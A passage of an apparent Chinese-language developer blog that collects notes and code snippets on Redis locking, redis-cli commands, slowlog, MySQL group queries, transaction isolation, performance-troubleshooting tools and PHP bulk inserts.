* 解锁https://github.com/laravel/framework/blob/5.6/src/Illuminate/Cache/RedisLock.php#L36 </span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * 参考： https://github.com/phpredis/phpredis/blob/develop/tests/RedisTest.php</span></span><br><span class="line"><span class="comment">         * @param $redis</span></span><br><span class="line"><span class="comment">         * @param $key</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">$redis, $key</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $lua =&lt;&lt;&lt;EOT</span><br><span class="line">if redis.call("get",KEYS[1]) == ARGV[1] then</span><br><span class="line">    return redis.call("del",KEYS[1])</span><br><span class="line">else</span><br><span class="line">    return 0</span><br><span class="line">end</span><br><span class="line">EOT;</span><br><span class="line">            $result = $redis-&gt;eval($lua, array($key, self::LOCK_VALUE), 1);</span><br><span class="line">            return $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public function acquire()</span><br><span class="line">    &#123;</span><br><span class="line">        $result = $this-&gt;redis-&gt;setnx($this-&gt;name, 1);</span><br><span class="line">        if ($result === 1 &amp;&amp; $this-&gt;seconds &gt; 0) &#123;</span><br><span class="line">            $this-&gt;redis-&gt;expire($this-&gt;name, $this-&gt;seconds);</span><br><span class="line">        &#125;</span><br><span class="line">        return $result === 1;</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * Release the lock.</span><br><span class="line">     *</span><br><span class="line">     * @return void</span><br><span class="line">     */</span><br><span class="line">    public function release()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;redis-&gt;del($this-&gt;name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="redis-cli"><a href="#redis-cli" class="headerlink" title="redis-cli"></a>redis-cli</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://juejin.im/book/5afc2e5f6fb9a07a9b362527/section/5bcfd27051882577e962f064</span></span><br><span class="line">$ redis-cli incrby foo <span class="number">5</span></span><br><span class="line">(integer) <span class="number">5</span></span><br><span class="line">$ redis-cli incrby foo <span class="number">5</span></span><br><span class="line">(integer) <span class="number">10</span></span><br><span class="line">$ redis-cli info &gt; info.txt</span><br><span class="line">$ wc -l info.txt</span><br><span class="line">     <span class="number">120</span> info.txt</span><br><span class="line"><span class="comment">// -n 2 表示使用第2个库，相当于 select 2</span></span><br><span class="line">$ redis-cli -h localhost -p <span class="number">6379</span> -n <span class="number">2</span> ping</span><br><span class="line">PONG</span><br><span class="line">$ cat cmds.txt</span><br><span class="line">set foo1 bar1</span><br><span class="line">set foo2 bar2</span><br><span class="line">set foo3 bar3</span><br><span class="line">......</span><br><span class="line">$ cat cmds.txt | redis-cli</span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">$ redis-cli &lt; cmds.txt</span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line"><span class="comment">// 间隔1s，执行5次，观察qps的变化</span></span><br><span class="line">$ redis-cli -r <span class="number">5</span> -i <span class="number">1</span> info | grep ops</span><br><span class="line">instantaneous_ops_per_sec:<span class="number">43469</span></span><br><span class="line">instantaneous_ops_per_sec:<span class="number">47460</span></span><br><span class="line">如果将次数设置为 <span class="number">-1</span> 那就是重复无数次永远执行下去。如果不提供 -i 参数，那就没有间隔，连续重复执行。在交互模式下也可以重复执行指令，形式上比较怪异，在指令前面增加次数</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; <span class="number">5</span> ping</span><br><span class="line">PONG</span><br><span class="line">PONG</span><br><span class="line">PONG</span><br><span class="line">PONG</span><br><span class="line">PONG</span><br><span class="line"># 下面的指令很可怕，你的屏幕要愤怒了</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; <span class="number">10000</span> info</span><br><span class="line">$ redis-cli rpush lfoo a b c d e f g</span><br><span class="line">(integer) <span class="number">7</span></span><br><span class="line">$ redis-cli --csv lrange lfoo <span class="number">0</span> <span class="number">-1</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"e"</span>,<span class="string">"f"</span>,<span class="string">"g"</span></span><br><span class="line">$ redis-cli hmset hfoo a <span class="number">1</span> b <span class="number">2</span> c <span class="number">3</span> d <span class="number">4</span></span><br><span class="line">OK</span><br><span class="line">$ redis-cli --csv hgetall hfoo</span><br><span class="line"><span class="string">"a"</span>,<span class="string">"1"</span>,<span class="string">"b"</span>,<span class="string">"2"</span>,<span class="string">"c"</span>,<span class="string">"3"</span>,<span class="string">"d"</span>,<span class="string">"4"</span></span><br><span class="line">$ redis-cli --csv -r <span class="number">5</span> hgetall hfoo</span><br><span class="line"><span class="string">"a"</span>,<span class="string">"1"</span>,<span class="string">"b"</span>,<span class="string">"2"</span>,<span class="string">"c"</span>,<span class="string">"3"</span>,<span class="string">"d"</span>,<span class="string">"4"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"1"</span>,<span class="string">"b"</span>,<span class="string">"2"</span>,<span class="string">"c"</span>,<span class="string">"3"</span>,<span class="string">"d"</span>,<span class="string">"4"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"1"</span>,<span class="string">"b"</span>,<span class="string">"2"</span>,<span class="string">"c"</span>,<span class="string">"3"</span>,<span class="string">"d"</span>,<span class="string">"4"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"1"</span>,<span class="string">"b"</span>,<span class="string">"2"</span>,<span class="string">"c"</span>,<span class="string">"3"</span>,<span class="string">"d"</span>,<span class="string">"4"</span></span><br><span class="line"><span class="string">"a"</span>,<span class="string">"1"</span>,<span class="string">"b"</span>,<span class="string">"2"</span>,<span class="string">"c"</span>,<span class="string">"3"</span>,<span class="string">"d"</span>,<span class="string">"4"</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; <span class="built_in">eval</span> <span class="string">"return redis.pcall('mset', KEYS[1], ARGV[1], KEYS[2], ARGV[2])"</span> <span class="number">2</span> foo1 foo2 bar1 bar2</span><br><span class="line">OK</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; <span class="built_in">eval</span> <span class="string">"return redis.pcall('mget', KEYS[1], KEYS[2])"</span> <span class="number">2</span> foo1 foo2</span><br><span class="line"><span class="number">1</span>) <span class="string">"bar1"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"bar2"</span></span><br><span class="line">redis-cli --stat 参数来实时监控服务器的状态，间隔 <span class="number">1</span>s 实时输出一次。</span><br><span class="line">$ ./redis-cli --bigkeys -i <span class="number">0.01</span></span><br><span class="line">--bigkeys 参数可以很快扫出内存里的大 KEY，使用 -i 参数控制扫描间隔，避免扫描指令导致服务器的 ops 陡增报警。</span><br><span class="line">$ redis-cli --host <span class="number">192.168</span>.x.x --port <span class="number">6379</span> monitor</span><br><span class="line"><span class="number">1539853410.458483</span> [<span class="number">0</span> <span class="number">10.100</span><span class="number">.90</span><span class="number">.62</span>:<span class="number">34365</span>] <span class="string">"GET"</span> <span class="string">"6yax3eb6etq8:&#123;-7&#125;"</span></span><br><span class="line"><span class="number">1539853410.459212</span> [<span class="number">0</span> <span class="number">10.100</span><span class="number">.90</span><span class="number">.61</span>:<span class="number">56659</span>] <span class="string">"PFADD"</span> <span class="string">"growth:dau:20181018"</span> <span class="string">"2klxkimass8w"</span></span><br><span class="line">如果你想观察主从服务器之间都同步了那些数据，可以使用 redis-cli 模拟从库。</span><br><span class="line"></span><br><span class="line">$ ./redis-cli --host <span class="number">192.168</span>.x.x --port <span class="number">6379</span> --slave</span><br><span class="line">SYNC <span class="keyword">with</span> master, discarding <span class="number">51778306</span> bytes <span class="keyword">of</span> bulk transfer...</span><br><span class="line">$ ./redis-cli --host <span class="number">192.168</span>.x.x --port <span class="number">6379</span> --rdb ./user.rdb</span><br><span class="line">SYNC sent to master, writing <span class="number">2501265095</span> bytes to <span class="string">'./user.rdb'</span> 远程 rdb 备份</span><br><span class="line"></span><br><span class="line">只有query执行时间大于slowlog-log-slower-than的才会定义成慢查询，才会被slowlog进行记录。slowlog-log-slower-than设置的单位是微秒，默认是<span class="number">10000</span>微秒，也就是<span class="number">10</span>毫秒。slowlog-max-len表示慢查询最大的条数，当slowlog超过设定的最大值后，会将最早的slowlog删除，是个FIFO队列。</span><br><span class="line"></span><br><span class="line">查看slowlog总条数</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; SLOWLOG LEN</span><br><span class="line"></span><br><span class="line">(integer) <span class="number">4</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; CONFIG GET slowlog-*</span><br><span class="line"><span class="number">1</span>) <span class="string">"slowlog-log-slower-than"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"100"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"slowlog-max-len"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"1024"</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; SLOWLOG GET <span class="number">11</span>) <span class="number">1</span>) (integer) <span class="number">26</span>            <span class="comment">// slowlog唯一编号id2) (integer) 1440057815    // 查询的时间戳3) (integer) 47            // 查询的耗时（微秒），如表示本条命令查询耗时47微秒4) 1) "SLOWLOG"            // 查询命令，完整命令为 SLOWLOG GET，slowlog最多保存前面的31个key和128字符2) "GET"</span></span><br><span class="line"></span><br><span class="line"> debug sleep阻塞了set命令，set命令的整体响应时间(R)是<span class="number">1530357</span>微秒，而其服务时间(S)为<span class="number">8</span>微秒，排队延迟(Q)为<span class="number">1530349</span>微秒。</span><br><span class="line"> </span><br><span class="line"> Session<span class="number">-1</span>:</span><br><span class="line"> xxxx:<span class="number">6386</span>&gt; debug sleep <span class="number">6</span></span><br><span class="line"> OK</span><br><span class="line"> (<span class="number">6.00</span>s)</span><br><span class="line"> </span><br><span class="line"> Session<span class="number">-2</span>:</span><br><span class="line"> xxxxx:<span class="number">6386</span>&gt; set a b</span><br><span class="line"> OK</span><br><span class="line"> (<span class="number">1.53</span>s)</span><br><span class="line"> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; SLOWLOG RESET</span><br><span class="line"> OK</span><br><span class="line"> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; SLOWLOG LEN</span><br><span class="line"> (integer) <span class="number">0</span></span><br><span class="line"> redis-cli monitor打印出所有sever接收到的命令以及其对应的客户端地址</span><br><span class="line"> </span><br><span class="line"> $ redis-cli monitor</span><br><span class="line"> redis-cli --stat查看当前连接的客户端数，连接数等</span><br><span class="line"> 按前缀/模式批量删除keys</span><br><span class="line"> redis-cli keys david* | xargs redis-cli del</span><br><span class="line"> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; <span class="built_in">eval</span> <span class="string">"local keys = redis.call('keys',KEYS[1]) for i,v in ipairs(keys) do redis.call('del',v) end"</span> <span class="number">1</span> david*</span><br></pre></td></tr></table></figure>
<h3 id="每个分组的最后一条记录"><a href="#每个分组的最后一条记录" class="headerlink" title="每个分组的最后一条记录"></a>每个分组的最后一条记录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> t_tmp group by FCityId order by FUpdateTime desc;<span class="string">` 结果却是错误的！http://blog.text.wiki/2015/04/03/retrieve-the-last-record-in-each-group.html</span></span><br><span class="line"><span class="string">SELECT * FROM (SELECT * FROM t_tmp ORDER BY FUpdateTime DESC)tmptable GROUP BY FCityId ORDER BY FUpdateTime DESC;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SELECT m1. * FROM t_tmp m1 LEFT JOIN t_tmp m2 ON ( m1.FCityId = m2.FCity</span></span><br><span class="line"><span class="string">Id AND m1.FId &lt; m2.FId )  WHERE m2.FId IS NULL ORDER BY FUpdateTime DESC LIMIT 0</span></span><br><span class="line"><span class="string">, 30;</span></span><br></pre></td></tr></table></figure>
<h3 id="超过经理收入的员工"><a href="#超过经理收入的员工" class="headerlink" title="超过经理收入的员工"></a>超过经理收入的员工</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> SELECT e.Name AS Employee</span><br><span class="line">    FROM Employee e, Employee e1</span><br><span class="line">    WHERE e.ManagerId = e1.id</span><br><span class="line">        AND e.Salary &gt; e1.Salary;</span><br><span class="line">Department	Employee	Salary</span><br><span class="line">IT	Max	<span class="number">90000</span></span><br><span class="line">Sales	Henry	<span class="number">80000</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/24492</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-之事务隔离级别"><a href="#MySQL-之事务隔离级别" class="headerlink" title="MySQL 之事务隔离级别"></a>MySQL 之事务隔离级别</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">MySQL事务主要用于处理一个包含操作量比较大、复杂的业务。比如说，删除一个学生，我们除了要删除该学生的基本信息，同时也要删除考试记录、违规记录等。诸多的操作组成一个事务。事务是用来管理insert、update、<span class="keyword">delete</span>基本指令的。当MySQL使用innodb引擎的前提下才支持事务操作</span><br><span class="line">https:<span class="comment">//learnku.com/articles/24581#topnav https://www.itcodemonkey.com/article/13020.html</span></span><br><span class="line">隔离性的类别</span><br><span class="line"></span><br><span class="line">read uncommitted | 读未提交</span><br><span class="line">read committed | 读已提交</span><br><span class="line">repeatable read | 可重复读</span><br><span class="line">serializable | 串行化</span><br><span class="line">在MySQL数据库中，引擎默认使用repeatable read</span><br><span class="line"></span><br><span class="line"># SELECT @@tx_isolation 或者 SELECT @@transaction_isolation</span><br><span class="line"># MySQL 8.x </span><br><span class="line"># transaction_isolation在MySQL 5.7.20中添加了作为别名 tx_isolation，现已弃用，并在MySQL 8.0中删除。</span><br><span class="line"># 应调整应用程序transaction_isolation以优先使用 tx_isolation。</span><br><span class="line">mysql&gt; SELECT @@transaction_isolation;</span><br><span class="line">+-------------------------+</span><br><span class="line">| @@transaction_isolation |</span><br><span class="line">+-------------------------+</span><br><span class="line">| REPEATABLE-READ         |</span><br><span class="line">+-------------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">## 将事务隔离的模式设置为[可重复读]</span><br><span class="line">mysql&gt; set session transaction isolation level repeatable read;</span><br><span class="line">Query OK, <span class="number">0</span> rows affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">## (1)事务A读取scor数据表</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> score;</span><br><span class="line">+----+----------+-------+</span><br><span class="line">| id | name     | score |</span><br><span class="line">+----+----------+-------+</span><br><span class="line">|  <span class="number">1</span> | alicfeng |    <span class="number">75</span> |</span><br><span class="line">|  <span class="number">2</span> | feng     |   <span class="number">100</span> |</span><br><span class="line">|  <span class="number">3</span> | alic     |    <span class="number">90</span> |</span><br><span class="line">+----+----------+-------+</span><br><span class="line"><span class="number">3</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">## (2)事务B新增删除一条数据并提交</span><br><span class="line">mysql&gt; <span class="keyword">delete</span> <span class="keyword">from</span> score where id=<span class="number">1</span>;</span><br><span class="line">Query OK, <span class="number">1</span> row affected (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; commit;</span><br><span class="line">Query OK, <span class="number">0</span> rows affected (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">## (3)事务A再次读取score数据表</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> score;</span><br><span class="line">+----+----------+-------+</span><br><span class="line">| id | name     | score |</span><br><span class="line">+----+----------+-------+</span><br><span class="line">|  <span class="number">1</span> | alicfeng |    <span class="number">75</span> |</span><br><span class="line">|  <span class="number">2</span> | feng     |   <span class="number">100</span> |</span><br><span class="line">|  <span class="number">3</span> | alic     |    <span class="number">90</span> |</span><br><span class="line">+----+----------+-------+</span><br><span class="line"><span class="number">3</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="MySQL性能突发事件问题排查技巧"><a href="#MySQL性能突发事件问题排查技巧" class="headerlink" title="MySQL性能突发事件问题排查技巧"></a>MySQL性能突发事件问题排查技巧</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//mp.weixin.qq.com/s/qCRfxIr1RoHd9i8-Hk8iuQ</span></span><br><span class="line">top — Linux 系统进程监控</span><br><span class="line">iostat</span><br><span class="line"> vmstat — 虚拟内存统计</span><br><span class="line">[xxx@localhost ~]$ vmstat</span><br><span class="line">procs -----------memory---------- ---swap-- -----io---- --system-- -----cpu-----</span><br><span class="line"> r  b   swpd   free   buff  cache   si   so    bi    bo   <span class="keyword">in</span>   cs us sy id wa st</span><br><span class="line"> <span class="number">0</span>  <span class="number">0</span> <span class="number">945448</span> <span class="number">437836</span> <span class="number">618928</span> <span class="number">5950612</span>    <span class="number">1</span>    <span class="number">0</span>    <span class="number">13</span>   <span class="number">685</span>    <span class="number">0</span>    <span class="number">0</span> <span class="number">16</span>  <span class="number">2</span> <span class="number">82</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"> lsof — 打开文件列表</span><br><span class="line"> [finance@localhost ~]$ lsof -c php-fpm</span><br><span class="line"> COMMAND   PID    USER   FD      TYPE     DEVICE SIZE/OFF       NODE NAME</span><br><span class="line"> php-fpm  <span class="number">3893</span>    root  cwd   unknown                                /proc/<span class="number">3893</span>/cwd (readlink: Permission denied)</span><br><span class="line"> php-fpm  <span class="number">3893</span>    root  rtd   unknown                                /proc/<span class="number">3893</span>/root (readlink: Permission denied)</span><br><span class="line"> php-fpm  <span class="number">3893</span>    root  txt   unknown                                /proc/<span class="number">3893</span>/exe (readlink: Permission denied)</span><br><span class="line"> php-fpm  <span class="number">3893</span>    root NOFD                                          /proc/<span class="number">3893</span>/fd (opendir: Permission denied)</span><br><span class="line"> php-fpm  <span class="number">3894</span> root  cwd       DIR        <span class="number">8</span>,<span class="number">2</span>     <span class="number">4096</span>      <span class="number">90113</span> /root</span><br><span class="line"> php-fpm  <span class="number">3894</span> root  rtd       DIR        <span class="number">8</span>,<span class="number">2</span>     <span class="number">4096</span>          <span class="number">2</span> /</span><br><span class="line"> php-fpm  <span class="number">3894</span> root  txt       REG        <span class="number">8</span>,<span class="number">7</span> <span class="number">37943970</span>     <span class="number">264189</span> /data/php55/sbin/php-fpm</span><br><span class="line">tcpdump — 网络数据包分析器</span><br><span class="line">netstat — 网络统计 监控网络数据包传入和传出的统计界面的命令行工具</span><br><span class="line">[XXX@localhost ~]$ netstat -a |more</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127</span>:<span class="number">6379</span> *:*                         LISTEN</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> localhost:<span class="number">6379</span>              *:*                         LISTEN</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> localhost:<span class="number">9004</span>              *:*                         LISTEN</span><br><span class="line"></span><br><span class="line">SHOW PROCESSLIST; —当前MySQL数据库的运行的所有线程</span><br><span class="line">INNODB_TRX; — 当前运行的所有事务</span><br><span class="line">mysql&gt; select *<span class="keyword">from</span> information_schema.INNODB_TRX\G</span><br><span class="line">INNODB_LOCKS; — 当前出现的锁</span><br><span class="line">select *<span class="keyword">from</span> information_schema.INNODB_LOCKS\G</span><br><span class="line">INNODB_LOCK_WAITS; — 锁等待的对应关系计</span><br><span class="line">mysql&gt; select *<span class="keyword">from</span> information_schema.INNODB_LOCK_WAITS\G</span><br><span class="line">SHOW OPEN TABLES where In_use &gt;<span class="number">0</span>; — 当前打开表</span><br><span class="line">SHOW ENGINE INNODB STATUS  \G; —Innodb状态</span><br><span class="line">SHOW STATUS LIKE  <span class="string">'innodb_row_lock_%'</span>; — 锁性能状态</span><br><span class="line">SQL语句EXPLAIN; — 查询优化器</span><br></pre></td></tr></table></figure>
<h3 id="Mysql-批量写入数据"><a href="#Mysql-批量写入数据" class="headerlink" title="Mysql 批量写入数据"></a>Mysql 批量写入数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//my.oschina.net/famoustone/blog/856736</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">insertTest</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">		set_time_limit(<span class="number">0</span>);   <span class="comment">//防止超300s 500错误</span></span><br><span class="line">	</span><br><span class="line">		$t1 = microtime(<span class="literal">true</span>);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		<span class="comment">//随机插入num条</span></span><br><span class="line">		<span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;=<span class="number">200000</span>; $i++)&#123;</span><br><span class="line">			</span><br><span class="line">			$result = $<span class="keyword">this</span>-&gt;db-&gt;insert(<span class="string">'myisam'</span>, [<span class="string">'value'</span> =&gt; uniqid().$i]);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//程序运行时间</span></span><br><span class="line">		$t2 = microtime(<span class="literal">true</span>);</span><br><span class="line">		echo <span class="string">'耗时：'</span>.round($t2-$t1,<span class="number">3</span>).<span class="string">'秒&lt;br&gt;'</span>;</span><br><span class="line">		echo <span class="string">'内存消耗：'</span>.round(memory_get_usage()/<span class="number">1048576</span>,<span class="number">2</span>).<span class="string">" M&lt;br/&gt;"</span>;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	    <span class="number">167</span>秒，时间<span class="number">20</span>w 数据 Myisam要 接近<span class="number">3</span>分钟了。</span><br><span class="line">    </span><br><span class="line">my.cnf 当innodb_flush_log_at_trx_commit=<span class="number">2</span>时, 每次事务提交时, MySQL会把log buffer的数据写入log file, 但          不会主动触发flush(刷新到disk)操作同时进行. 然而, MySQL会每秒执行一次flush(刷新到disk)操作.</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">insertTest</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">		set_time_limit(<span class="number">0</span>);   <span class="comment">//防止超300s 500错误</span></span><br><span class="line">	</span><br><span class="line">		$t1 = microtime(<span class="literal">true</span>);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		$sql = <span class="string">"insert into innodb (value) VALUES"</span>;</span><br><span class="line">		<span class="comment">//随机插入num条</span></span><br><span class="line">		<span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;=<span class="number">200000</span>; $i++)&#123;</span><br><span class="line">			</span><br><span class="line">			$val = uniqid().$i;</span><br><span class="line">				</span><br><span class="line">			$sql .= <span class="string">"('&#123;$val&#125;'),"</span>;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		$sql = substr($sql,<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line">		</span><br><span class="line">		<span 